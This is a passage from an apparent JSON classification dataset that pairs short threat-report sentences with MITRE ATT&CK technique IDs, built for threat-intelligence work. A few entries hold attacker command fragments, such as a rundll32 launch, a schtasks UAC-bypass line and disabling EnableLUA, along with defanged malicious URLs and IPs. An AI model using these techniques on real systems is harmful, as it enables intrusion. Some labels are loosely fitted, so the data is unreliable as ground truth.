    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "copies files from removable drives to C:\\system.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can create registry keys to load driver files.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "being able to use the .NET framework APIs directly from Python.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can delete files written to disk.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute files to further infect a host machine with additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall its persistence mechanism and delete its configuration file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from a compromised host.(Citation: Profero APT27 December 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If a target opens the malicious attachment,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a command to collect victim system information including the system name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Will also skip enumeration and stopping of antivirus software.-",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded files malware and tools from its C2 onto a compromised host.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls May 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows API to execute code within a victim's system. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "have enumerated files and directories or searched in specific locations within a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can send and receive data over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses a script to automate tasks on the victim's machine and to assist in execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list local drives and enumerate the OS architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to obtain file and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can gather information on the network configuration of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the given task the downloaded file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "searches the File system for files of interest. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "may enumerate user directories on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to execute binaries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used SchTasks for execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from infected machines after receiving a command with `uploaddd` in the string.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "large volumes of files have been stolen from victims' MOVEit transfer systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "injects itself into explorer.exe.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in outbound communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When the data was gathered on a local system using the backdoor",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "leveraged by a batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to automate the remote execution of PowerShell scripts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows command-line to run commands.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "persists through a scheduled task that executes it every minute.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "a downloader that downloads and executes a payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Manipulates (creates, lists, starts, stops and deletes) services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can use stolen service account tokens to perform its operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can save collected data to disk different file formats and network shares.(Citation: Securelist Dtrack)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the network interface MAC address on the infected host.(Citation: TrendMicro MacOS April 2018)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has stored its malicious payload in the registry key HKLM\\SOFTWARE\\Microsoft\\DRM.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can collect and send the local IP address RDP information and the network adapter physical address as a part of its C2 beacon.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors injected code into a selected process which in turn launches a command as a child process of the original.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search for files on the compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "that stages execution of further payloads downloaded from the internet",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the volumes mapped on the system and also steals files with the following extensions: .docx .doc .pptx .ppt .xlsx .xls .rtf and .pdf.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used a compromised O365 administrator account to create a new Service Principal.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has a command to create a scheduled task for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "contains a module for downloading and executing DLLs that leverages rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can be used to export events from a specific log.(Citation: Wevtutil Microsoft Documentation)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has gained execution through victims opening malicious files.(Citation: Amnesty Intl. Ocean Lotus February 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "required users to click on a malicious file for the loader to activate.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "execution begins with the user clicking on a shortcut file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "had used `cmd.exe` and Windows Script Host (wscript) to execute malicious code.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used Rundll32 to execute payloads.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "uploads data to the C2 via a HTTP POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Adds Run Registry Key for Persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used an open source batch script to modify Windows Defender registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can use loop operations to enumerate directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used `rundll32` for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated hosts looking to obtain a list of all currently running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP/HTTPS for command and control communication.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the first stage downloader resolved various Windows libraries and APIs including `LoadLibraryA()` `GetProcAddress()` and `CreateProcessA()`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use WinSock API for communication including WSASend and WSARecv.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "moved laterally via RDP.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\System32\\cmd.exe /c start rundll32 namr.dll,IternalJob",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "recursively removes the implementation of Windows Defender IOfficeAntiVirus",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "launches a shell to execute commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "stores the gathered data from the machine in .db files and .bmp files under four separate locations.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry on compromised hosts using RegQueryValueExA.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "such as Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "creating a schedule task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string &&&.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files on infected machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject malicious DLLs into a specific process for privilege escalation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can determine the hostname and linux version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has been used to monitor process lists.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used different API calls including `GetProcAddress` `VirtualAllocEx` `WriteProcessMemory` `CreateProcessA` and `SetThreadContext`.(Citation: Malwarebytes Saint Bot April 2021)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious Microsoft Word documents sent via email which prompted the victim to enable macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "deleted the DLL dropper from the victims machine to cover their tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "backdoor with the ability to download and run additional tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can receive configuration updates and additional payloads including wscpy.exe from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used a Visual Basic script that checked for internet connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to distinguish between a standard user and an administrator on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "injects an entire DLL into an existing newly created or preselected trusted process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional files.  has also downloaded a ransomware payload called Hermes.(Citation: Unit42 Azorult Nov 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LoadLibraryW, VirtualAlloc, CreateProccessW, and ZwUnmapViewOfSection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "After obtaining a valid account, they use this account to access the victim’s VPN, Citrix or another remote service that allows access to the network of the victim.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "copying the current process command line as a new argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a temporary scheduled task to start after installation.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collects system information including computer and domain names OS version and S7P paths.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "checks for information on the CPU fan temperature mouse hard disk and motherboard as part of its anti-VM checks.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into executing malicious files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can be used to copy files from a given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has disabled dynamic analysis and other security tools including IDA debugger x32dbg and OllyDbg.(Citation: McAfee Maze March 2020) It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can search for files in directories. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Several commands are supported by the 's implant via the command-line interface and theres also a utility to execute any custom command on an infected endpoint.  used batch scripting.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "via the find.bat batch script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.(Citation: Forcepoint Monsoon)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "actors disable antivirus software",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "a successful sign-in to the Microsoft Azure environment was observed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can delete files downloaded to the compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "stages data it copies from the local system or removable drives in the %WINDIR%\\$NtUninstallKB885884$\\ directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can be used to create  to upload and/or download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by installing itself in the startup folder whereas the GO variant has created a `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM` registry key.(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "when using the HTTPS-enabled options",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has functionality to disable security tools including Kaspersky BitDefender and MalwareBytes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username from a victim machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors gathered a recursive directory listing to find files and directories of interest.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has lured targets to click on malicious files to gain execution in the target environment.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors disabled anti-virus and anti-spyware tools in some instances on the victims machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware can deliver payloads from the command and control (C2) server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key.(Citation: Anomali Evasive Maneuvers July 2015)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "contains the ability to inject .NET assemblies into unmanaged processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional code and files from servers onto victims.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used wmi queries to gather information from the system. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Computer name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can gather information on drives and the operating system on the victims machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects files from the local system that have the following extensions then prepares them for exfiltration: .xls .xlsx .pdf .mdb .rar .zip .doc .docx.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors spawned a new `cmd.exe` process to execute commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use a file exfiltration tool to collect recently changed files with specific extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "sets a WH_CBT Windows hook to search for and capture files on the victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the malicious batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a command to upload a file to the victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can mark its binary code for deletion after reboot.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.    Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can execute arbitrary commands with the command line.(Citation: Cybereason Molerats Dec 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks to run malicious scripts on a compromised host.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can inject code from files to other running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "deletes all files written to disk in the current working directory",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "obtains the current user's security identifier.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the username from an infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A  variant has used rundll32 for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated files on a compromised host.(Citation: US District Court Indictment GRU Unit 74455 October 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor injected into various processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PE injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "searches for different processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "creates Registry keys to allow itself to run as various services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject DLLs into processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to store its components in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collecting information on the system,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "uses WMI to perform process monitoring.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "used the command query user on victim hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "installer uses WMI to search for antivirus display names.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to find files on the targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected system information including the machine name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect files from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "steals credentials from LSASS",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to quit and delete itself.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "By modifying the below registry value EnableLUA to “0”",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has run ipconfig /all on a victim.(Citation: Palo Alto OilRig May 2016)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can create directories to store plugin output and stage data for exfiltration.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the computer name of the victim's system during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can identify the system name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the getprocesslist command to enumerate processes on a compromised host.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has been observed deleting the temporary files once they fulfill their task.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses tasklist /v to check running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can execute ipconfig on the victims machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020) ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has added and deleted keys from the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has collected the host name and operating system product name from a compromised machine. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has pushed additional malicious tools onto an infected system to steal user credentials move laterally and destroy data.(Citation: ESET Telebots Dec 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can open an active screen of the victims machine and take control of the mouse and keyboard.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "injects into the svchost.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the hostname OS version and OS architecture of an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can make modifications to the Regsitry for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "collects local files and information from the victim’s local machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "A new service was created",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used  to execute tasks on the system. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted data staged in tmp files after exfiltration.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used DriveLetterView to enumerate drive information.",
    "command": "",
